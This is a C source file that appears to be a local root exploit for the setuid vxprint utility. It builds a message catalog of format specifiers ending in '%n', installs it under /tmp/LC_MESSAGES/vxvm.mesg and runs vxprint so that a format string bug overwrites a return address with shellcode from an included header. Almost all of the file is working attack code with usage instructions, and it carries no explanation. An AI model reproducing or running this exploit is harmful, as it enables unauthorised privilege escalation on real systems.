#include <stdio.h>
#include "shellcode.h"

/* This is base of format string return address */
/* Base address of vxprint is 0x20c7c(134268) */
#define BASE 134268

main(int argc, char *argv[])
{
   FILE *fp;
   char *retaddr;
   long g_len, offset;
   int count, count2, line=700, n=19;

   if(argc < 2 || argc > 3) {
      printf("Usage: %s ret-address offset\n", argv[0]);
      exit(1);
   }

   retaddr = argv[1];
   if(argc == 3) offset = atol(argv[2]);
   else offset = 0;

   g_len = strtol(retaddr, NULL, 16);
   g_len -= BASE;
   g_len += offset;
   fp = fopen("testdef", "w+");
   if(fp == NULL) {
      fprintf(stderr, "can not open file.\n"); exit(1);
   }
   for(count=0; count<line; count++) {
      for(count2=0; count2<n; count2++)
         fprintf(fp, "%%10x");
      fprintf(fp, "%%%dx%%n\n", g_len);
   }
   fclose(fp);

   remove("testout");
   system("mkmsgs testdef testout");
   mkdir("/tmp/LC_MESSAGES", 0755);
   system("mv
testout /tmp/LC_MESSAGES/vxvm.mesg");

   printf("ret addr = 0x%x\n", g_len);
   /* this, also can any set uid command */
   execl("/usr/sbin/vxprint", "vxprint", "---", NULL);
}
